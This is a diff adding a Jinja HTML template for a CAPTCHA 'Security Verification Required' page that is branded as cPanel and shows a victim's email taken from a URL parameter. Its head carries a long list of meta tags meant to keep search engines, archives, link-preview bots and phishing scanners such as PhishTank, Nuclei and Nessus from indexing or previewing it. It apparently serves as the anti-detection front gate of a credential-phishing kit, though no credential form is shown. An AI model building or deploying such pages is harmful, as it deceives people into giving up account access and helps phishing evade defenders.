@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+	<!-- General directive for all compliant bots -->
+	<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noodp, notranslate, nositelinkssearchbox, max-snippet:-1, max-image-preview:none, max-video-preview:0">
+	
+	<!-- Major search engines -->
+	<meta name="googlebot" content="noindex, nofollow, noarchive, notranslate, nositelinkssearchbox, max-image-preview:none, max-snippet:-1, max-video-preview:0">
+	<meta name="googlebot-news" content="noindex, nofollow, noarchive">
+	<meta name="googlebot-image" content="noimageindex">
+	<meta name="bingbot" content="noindex, nofollow, noarchive, notranslate, nositelinkssearchbox">
+	<meta name="yandex" content="noindex, nofollow, noarchive">
+	<meta name="baiduspider" content="noindex, nofollow, noarchive">
+	<meta name="duckduckbot" content="noindex, nofollow, noarchive">
+	<meta name="exabot" content="noindex, nofollow, noarchive">
+	<meta name="sogou" content="noindex, nofollow, noarchive">
+	<meta name="teoma" content="noindex, nofollow, noarchive">
+	<meta name="slurp" content="noindex, nofollow, noarchive">
+	<meta name="applebot" content="noindex, nofollow, noarchive">
+	
+	<!-- Archiving and research crawlers -->
+	<meta name="ia_archiver" content="noindex, nofollow, noarchive">
+	<meta name="archive.org_bot" content="noindex, nofollow, noarchive">
+	<meta name="specialarchiver" content="noindex, nofollow, noarchive">
+	<meta name="nutch" content="noindex, nofollow, noarchive">
+	<meta name="heritrix" content="noindex, nofollow, noarchive">
+	<meta name="httrack" content="noindex, nofollow, noarchive">
+	
+	<!-- Social media bots -->
+	<meta name="facebookexternalhit" content="noindex, nofollow, noarchive">
+	<meta name="twitterbot" content="noindex, nofollow, noarchive">
+	<meta name="linkedinbot" content="noindex, nofollow, noarchive">
+	<meta name="pinterestbot" content="noindex, nofollow, noarchive">
+	<meta name="discordbot" content="noindex, nofollow, noarchive">
+	<meta name="slackbot" content="noindex, nofollow, noarchive">
+	<meta name="telegrambot" content="noindex, nofollow, noarchive">
+	<meta name="whatsapp" content="noindex, nofollow, noarchive">
+	<meta name="wechat" content="noindex, nofollow, noarchive">
+	<meta name="skypeuripreview" content="noindex, nofollow, noarchive">
+	
+	<!-- Advertising and media crawlers -->
+	<meta name="mediapartners-google" content="noindex, nofollow, noarchive">
+	<meta name="adsbot-google" content="noindex, nofollow, noarchive">
+	<meta name="adsbot-google-mobile" content="noindex, nofollow, noarchive">
+	
+	<!-- SEO & analytics crawlers -->
+	<meta name="ahrefsbot" content="noindex, nofollow, noarchive">
+	<meta name="mj12bot" content="noindex, nofollow, noarchive">
+	<meta name="semrushbot" content="noindex, nofollow, noarchive">
+	<meta name="dotbot" content="noindex, nofollow, noarchive">
+	<meta name="spbot" content="noindex, nofollow, noarchive">
+	<meta name="ezooms" content="noindex, nofollow, noarchive">
+	<meta name="searchmetricsbot" content="noindex, nofollow, noarchive">
+	<meta name="sistrix" content="noindex, nofollow, noarchive">
+	<meta name="megaindex.ru" content="noindex, nofollow, noarchive">
+	<meta name="linkpadbot" content="noindex, nofollow, noarchive">
+	<meta name="dataforseobot" content="noindex, nofollow, noarchive">
+	<meta name="serpstatbot" content="noindex, nofollow, noarchive">
+	<meta name="blexbot" content="noindex, nofollow, noarchive">
+	<meta name="panscient" content="noindex, nofollow, noarchive">
+	<meta name="youbot" content="noindex, nofollow, noarchive">
+	<meta name="neevabot" content="noindex, nofollow, noarchive">
+	<meta name="scoutjet" content="noindex, nofollow, noarchive">
+	<meta name="mojeekbot" content="noindex, nofollow, noarchive">
+	<meta name="cliqzbot" content="noindex, nofollow, noarchive">
+	<meta name="genieo" content="noindex, nofollow, noarchive">
+	<meta name="barkrowler" content="noindex, nofollow, noarchive">
+	<meta name="infotigerbot" content="noindex, nofollow, noarchive">
+	<meta name="ltx71" content="noindex, nofollow, noarchive">
+	<meta name="qwantify" content="noindex, nofollow, noarchive">
+	<meta name="safednsbot" content="noindex, nofollow, noarchive">
+	<meta name="aspiegelbot" content="noindex, nofollow, noarchive">
+	
+	<!-- Monitoring & performance bots -->
+	<meta name="uptimerobot" content="noindex, nofollow, noarchive">
+	<meta name="statuscake" content="noindex, nofollow, noarchive">
+	<meta name="pingdom" content="noindex, nofollow, noarchive">
+	<meta name="dareboost" content="noindex, nofollow, noarchive">
+	<meta name="gtmetrix" content="noindex, nofollow, noarchive">
+	<meta name="webpagetest" content="noindex, nofollow, noarchive">
+	<meta name="speedcurve" content="noindex, nofollow, noarchive">
+	<meta name="panopta" content="noindex, nofollow, noarchive">
+	
+	<!-- Security & scanning bots -->
+	<meta name="phishtank" content="noindex, nofollow, noarchive">
+	<meta name="aws security scanner" content="noindex, nofollow, noarchive">
+	<meta name="nuclei" content="noindex, nofollow, noarchive">
+	<meta name="nessus" content="noindex, nofollow, noarchive">
+	
+	<!-- Development & testing bots -->
+	<meta name="selenium" content="noindex, nofollow, noarchive">
+	<meta name="playwright" content="noindex, nofollow, noarchive">
+	<meta name="puppeteer" content="noindex, nofollow, noarchive">
+	<meta name="headlesschrome" content="noindex, nofollow, noarchive">
+	<meta name="phantomjs" content="noindex, nofollow, noarchive">
+	<meta name="cypress" content="noindex, nofollow, noarchive">
+	<meta name="webdriver" content="noindex, nofollow, noarchive">
+	<meta name="lighthouse" content="noindex, nofollow, noarchive">
+	<meta name="calypso" content="noindex, nofollow, noarchive">
+	
+	<!-- Feed & content fetchers -->
+	<meta name="feedfetcher-google" content="noindex, nofollow, noarchive">
+	<meta name="feedly" content="noindex, nofollow, noarchive">
+	<meta name="r6_feedfetcher" content="noindex, nofollow, noarchive">
+	<meta name="feedburner" content="noindex, nofollow, noarchive">
+	
+	<!-- Regional search engines -->
+	<meta name="seznambot" content="noindex, nofollow, noarchive">
+	<meta name="mail.ru_bot" content="noindex, nofollow, noarchive">
+	<meta name="zumbot" content="noindex, nofollow, noarchive">
+	<meta name="jikespider" content="noindex, nofollow, noarchive">
+	
+	<!-- HTTP client libraries -->
+	<meta name="python-urllib" content="noindex, nofollow, noarchive">
+	<meta name="go-http-client" content="noindex, nofollow, noarchive">
+	<meta name="java" content="noindex, nofollow, noarchive">
+	<meta name="apache-httpclient" content="noindex, nofollow, noarchive">
+	<meta name="okhttp" content="noindex, nofollow, noarchive">
+	<meta name="node-fetch" content="noindex, nofollow, noarchive">
+	<meta name="axios" content="noindex, nofollow, noarchive">
+	<meta name="restsharp" content="noindex, nofollow, noarchive">
+	<meta name="guzzlehttp" content="noindex, nofollow, noarchive">
+	<meta name="python-requests" content="noindex, nofollow, noarchive">
+	
+	<!-- Testing & benchmarking tools -->
+	<meta name="apachebench" content="noindex, nofollow, noarchive">
+	<meta name="ab" content="noindex, nofollow, noarchive">
+	<meta name="siege" content="noindex, nofollow, noarchive">
+	<meta name="wrk" content="noindex, nofollow, noarchive">
+	<meta name="vegeta" content="noindex, nofollow, noarchive">
+	<meta name="k6" content="noindex, nofollow, noarchive">
+	
+	<!-- Content aggregators -->
+	<meta name="paperlibot" content="noindex, nofollow, noarchive">
+	<meta name="tweetedtimes" content="noindex, nofollow, noarchive">
+	<meta name="tweetmemebot" content="noindex, nofollow, noarchive">
+	<meta name="spinn3r" content="noindex, nofollow, noarchive">
+	<meta name="inagist" content="noindex, nofollow, noarchive">
+	
+	<!-- Web service bots -->
+	<meta name="amazon cloudfront" content="noindex, nofollow, noarchive">
+	<meta name="cloudflare-alwaysonline" content="noindex, nofollow, noarchive">
+	<meta name="iframely" content="noindex, nofollow, noarchive">
+	<meta name="embedly" content="noindex, nofollow, noarchive">
+	<meta name="metauri" content="noindex, nofollow, noarchive">
+	<meta name="longurl" content="noindex, nofollow, noarchive">
+	
+	<!-- Generic fallbacks for unknown or custom user-agents -->
+	<meta name="crawler" content="noindex, nofollow, noarchive">
+	<meta name="spider" content="noindex, nofollow, noarchive">
+	<meta name="bot" content="noindex, nofollow, noarchive">
+	<meta name="curl" content="noindex, nofollow, noarchive">
+	<meta name="wget" content="noindex, nofollow, noarchive">
+	<meta name="scrapy" content="noindex, nofollow, noarchive">
+	<meta name="mechanize" content="noindex, nofollow, noarchive">
+	<meta name="beautifulsoup" content="noindex, nofollow, noarchive">
+	
+	<!-- Additional comprehensive protection -->
+	<meta name="google" content="nopagereadaloud, notranslate">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="referrer" content="no-referrer">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffffff, #f9f7f2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 15px;
+        }
+        
+        .card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background-color: #FF6C2C;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 18px;
+        }
+        
+        .content {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .info-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: #FF6C2C;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .info-text {
+            flex: 1;
+        }
+        
+        .info-text .title {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .info-text .email {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .captcha-container {
+            margin: 25px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        
+        .captcha-image {
+            background: white;
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            padding: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: #FF6C2C;
+            outline: none;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: #FF6C2C;
+            color: white;
+            padding: 10px 25px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background: #e55a1f;
+        }
+        
+        .footer {
+            background: #f0f0f0;
+            padding: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            display: none;
+        }
+        
+        .error {
+            background: #ffe6e6;
+            color: #d63031;
+            border: 1px solid #ffcccc;
+        }
+        
+        .instructions {
+            text-align: left;
+            margin-bottom: 25px;
+            color: #555;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>Security Verification Required</h1>
+            </div>
+            
+            <div class="content">
+                <div class="info-box">
+                    <div class="info-header">
+                        <div class="info-icon">!</div>
+                        <div class="info-text">
+                            <div class="title">Action Required</div>
+                            <div class="email">For: {{ request.args.get('web', 'default') }}</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <p>Enter the code displayed below to verify you are human:</p>
+                
+                <div class="captcha-container">
+                    <div class="captcha-image">
+                        <img src="data:image/png;base64,{{ img_data }}" alt="CAPTCHA Code" style="max-width: 100%; height: auto;">
+                    </div>
+                </div>
+                
+                <form id="captcha-form" method="POST" action="{{ url_for('captcha_challenge') }}">
+                    <div class="form-group">
+                        <label for="captcha-input">Security Code</label>
+                        <input type="text" id="captcha-input" class="form-control" name="code" placeholder="Enter the 6-digit code" required maxlength="6">
+                    </div>
+                    
+                    <input type="hidden" name="web" value="{{ request.args.get('web') }}">
+                    
+                    <button type="submit" class="btn">Verify & Continue</button>
+                </form>
+                
+                <div id="captcha-message" class="message error"></div>
+            </div>
+            
+            <div class="footer">
+                <p>&copy; 2026 cPanel. All Rights Reserved.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('captcha-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var captchaInput = document.getElementById('captcha-input');
+            var errorMessage = document.getElementById('captcha-message');
+            
+            if (captchaInput.value.length === 6) {
+                // Form is valid, submit it
+                this.submit();
+            } else {
+                // Show error message
+                errorMessage.textContent = 'Please enter the complete 6-digit security code.';
+                errorMessage.style.display = 'block';
+                captchaInput.focus();
+            }
+        });
+    </script>
+</body>
+</html>
